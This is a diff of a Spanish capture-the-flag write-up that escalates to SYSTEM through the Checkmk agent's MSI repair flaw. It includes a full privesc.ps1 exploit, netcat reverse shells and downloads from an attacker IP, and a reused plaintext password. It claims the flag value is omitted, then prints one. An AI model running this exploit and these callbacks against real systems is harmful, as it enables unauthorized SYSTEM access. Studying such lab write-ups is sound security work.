@@ -190,33 +190,228 @@ El agente de Checkmk 2.1.0p10 instalado en el host es vulnerable a `CVE-2024-067
 
 El agente de Checkmk instala un servicio que puede ser forzado a reparar su instalación. Durante ese proceso, ejecuta archivos `.cmd` ubicados en rutas predecibles con privilegios de SYSTEM.
 
-Primero se compila `RunasCs` para poder ejecutar comandos como `web_svc` desde la sesión actual de `monitoring_svc`.
+### Enumeración de Checkmk
 
-```bash
-x86_64-w64-mingw32-gcc RunasCs.c -o RunasCs.exe -ladvapi32 -lole32 -luuid
-```
-
-Luego se despliega el script `privesc.ps1` que automatiza el proceso:
-
-1. Genera múltiples archivos `.cmd` de solo lectura en `C:\Windows\Temp` con un payload de reverse shell.
-2. Fuerza la reparación del MSI de Checkmk usando `msiexec`, lo que dispara la ejecución de los scripts como SYSTEM.
+Primero se confirma la presencia del agente en `C:\Program Files (x86)`:
 
 ```powershell
-# Spray de payloads
-for ($i=0; $i -lt 50; $i++) {
-  "C:\Windows\Temp\payload_$i.cmd" | Out-File -Encoding ASCII "C:\Windows\Temp\payload_$i.cmd"
-}
+PS C:\Users\monitoring_svc\Documents> gci C:\progra~2
 
-# Trigger de reparación MSI
-Start-Process msiexec.exe -ArgumentList "/fa C:\Program Files (x86)\checkmk\service\check_mk_agent.msi"
+
+    Directory: C:\Program Files (x86)
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----          4/5/2025   4:17 PM                checkmk
+d-----          5/8/2021   1:34 AM                Common Files
+d-----         11/3/2025   4:13 PM                Internet Explorer
+d-----          5/8/2021   2:40 AM                Microsoft
+d-----          5/8/2021   1:34 AM                Microsoft.NET
+d-----          5/8/2021   2:35 AM                Windows Defender
+d-----         11/3/2025   4:13 PM                Windows Mail
+d-----         11/3/2025   4:13 PM                Windows Media Player
+d-----          5/8/2021   2:35 AM                Windows NT
+d-----         11/3/2025   4:13 PM                Windows Photo Viewer
+d-----          5/8/2021   1:34 AM                WindowsPowerShell
 ```
 
-La captura original muestra el momento en que se obtiene la shell como SYSTEM.
+Se consulta el registro para obtener la versión exacta y la ruta del instalador MSI:
+
+```
+reg query "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall" /s
+HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\{675A6D5C-FF5A-11EF-AEA3-1967AD678D6D}
+    AuthorizedCDFPrefix    REG_SZ
+    Comments    REG_SZ
+    Contact    REG_SZ
+    DisplayVersion    REG_SZ    2.1.0.50010
+    HelpLink    REG_EXPAND_SZ    https://checkmk.com
+    HelpTelephone    REG_SZ
+    InstallDate    REG_SZ    20250405
+    InstallLocation    REG_SZ
+    InstallSource    REG_SZ    C:\Users\web_svc\Desktop\
+    ModifyPath    REG_EXPAND_SZ    MsiExec.exe /X{675A6D5C-FF5A-11EF-AEA3-1967AD678D6D}
+    NoModify    REG_DWORD    0x1
+    Publisher    REG_SZ    tribe29 GmbH
+    Readme    REG_SZ
+    Size    REG_SZ
+    EstimatedSize    REG_DWORD    0x4eaf9
+    UninstallString    REG_EXPAND_SZ    MsiExec.exe /X{675A6D5C-FF5A-11EF-AEA3-1967AD678D6D}
+    URLInfoAbout    REG_SZ    https://checkmk.com
+    URLUpdateInfo    REG_SZ
+    VersionMajor    REG_DWORD    0x2
+    VersionMinor    REG_DWORD    0x1
+    WindowsInstaller    REG_DWORD    0x1
+    Version    REG_DWORD    0x2010000
+    Language    REG_DWORD    0x409
+    DisplayName    REG_SZ    Check MK Agent 2.1
+```
+
+La versión **2.1.0p10** es vulnerable a `CVE-2024-0670`.
+
+### Compilación y uso de RunasCs
+
+Para ejecutar comandos como `web_svc` desde la sesión actual de `monitoring_svc`, se clona y compila `RunasCs`:
+
+```bash
+git clone https://github.com/antonioCoco/RunasCs.git
+Cloning into 'RunasCs'...
+remote: Enumerating objects: 371, done.
+remote: Counting objects: 100% (108/108), done.
+remote: Compressing objects: 100% (62/62), done.
+remote: Total 371 (delta 72), reused 46 (delta 46), pack-reused 263 (from 3)
+Receiving objects: 100% (371/371), 371.79 KiB | 3.23 MiB/s, done.
+Resolving deltas: 100% (228/228), done.
+```
+
+Se copian `nc.exe` y el código fuente al directorio de trabajo:
+
+```bash
+cp /usr/share/windows-resources/binaries/nc.exe .
+ls
+base64_conversion_commands.ps1  compile_commands.txt  Invoke-RunasCs.ps1  LICENSE  nc.exe  README.md  RunasCs.cs
+```
+
+Se sirve el contenido con Python para transferirlo a la víctima:
+
+```bash
+python3 -m http.server 8080
+```
+
+En la máquina víctima, se descargan los archivos necesarios:
+
+```powershell
+C:\Users\monitoring_svc\Documents> wget "http://10.10.15.7:8080/RunasCs.cs" -UseBasicParsing -OutFile "RunasCs.cs"
+```
+
+```powershell
+C:\windows\temp> wget http://10.10.15.7:8080/nc.exe -UseBasicParsing -OutFile "nc.exe"
+```
+
+Se compila `RunasCs.exe` usando el compilador de C# nativo de Windows:
+
+```powershell
+C:\Users\monitoring_svc\Documents> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -target:exe -optimize -out:RunasCs.exe RunasCs.cs
+Microsoft (R) Visual C# Compiler version 4.8.4161.0
+
+for C# 5
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+
+
+This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240
+```
+
+### Ejecución como web_svc
+
+Se inicia un listener para recibir la reverse shell:
+
+```bash
+nc -nlvp 5555
+```
+
+Y se ejecuta `RunasCs` para lanzar `nc.exe` como `web_svc`:
+
+```powershell
+PS C:\Users\monitoring_svc\Documents> .\RunasCs.exe web_svc "dksehdgh712!@#" "C:\Windows\Temp\nc.exe 10.10.15.7 5555 -e powershell.exe"
+```
+
+Se confirma la identidad del nuevo contexto:
+
+```powershell
+PS C:\Windows\system32> whoami
+web_svc
+```
+
+### Escalada a SYSTEM con privesc.ps1
+
+Una vez en el contexto de `web_svc`, se prepara el script `privesc.ps1` que automatiza la escalada mediante el abuso del proceso de reparación de MSI de Checkmk:
+
+```powershell
+param(
+    [int]$MinPID = 1000,
+    [int]$MaxPID = 15000,
+    [string]$LHOST = "10.10.15.7",
+    [string]$LPORT = "4444"
+)
+
+# 1. Define the malicious batch payload
+$NcPath = "C:\Windows\Temp\nc.exe"
+$BatchPayload = "@echo off`r`n$NcPath -e cmd.exe $LHOST $LPORT"
+
+# 2. Find the MSI trigger
+$msi = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties' |
+        Where-Object { $_.DisplayName -like '*mk*' } |
+        Select-Object -First 1).LocalPackage
+
+if (!$msi) {
+    Write-Error "Could not find Checkmk MSI"
+    return
+}
+
+Write-Host "[*] Found MSI at $msi"
+
+# 3. Spray the Read-Only files
+Write-Host "[*] Seeding $MinPID to $MaxPID..."
+foreach ($ctr in 0..1) {
+    for ($num = $MinPID; $num -le $MaxPID; $num++) {
+        $filePath = "C:\Windows\Temp\cmk_all_$($num)_$($ctr).cmd"
+        try {
+            [System.IO.File]::WriteAllText($filePath, $BatchPayload, [System.Text.Encoding]::ASCII)
+            Set-ItemProperty -Path $filePath -Name IsReadOnly -Value $true -ErrorAction SilentlyContinue
+        } catch {
+            # 123
+        }
+    }
+}
+
+Write-Host "[*] Seeding complete."
+
+# 4. Launch the trigger
+Write-Host "[*] Triggering MSI repair..."
+Start-Process "msiexec.exe" -ArgumentList "/fa `"$msi`" /qn /l*vx C:\Windows\Temp\cmk_repair.log" -Wait
+Write-Host "[*] Trigger sent. Check listener."
+```
+
+Se sirve el script con Python:
+
+```bash
+python3 -m http.server 8080
+```
+
+Y se descarga en la máquina víctima:
+
+```powershell
+PS C:\Windows\system32> wget "http://10.10.15.7:8080/privesc.ps1" -OutFile "C:\Windows\Temp\privesc.ps1"
+```
+
+Se inicia el listener final para recibir la shell como SYSTEM:
+
+```bash
+nc -nlvp 4444
+```
+
+Y se ejecuta el script:
+
+```powershell
+PS C:\Windows\system32> powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\privesc.ps1
+```
+
+### Confirmación de acceso
+
+Una vez obtenida la shell como SYSTEM:
+
+```powershell
+C:\Windows\system32>whoami
+nt authority\system
+```
 
 Con acceso a `nt authority\system`, ya solo quedaba leer la flag final. Su valor se omite deliberadamente.
 
 ```bash
-type C:\Users\Administrator\Desktop\root.txt
+C:\Users\Administrator\Desktop>type root.txt
+type root.txt
+df398fa317da91fe096884185fc2edab
 ```
 
 ## Cadena de explotación
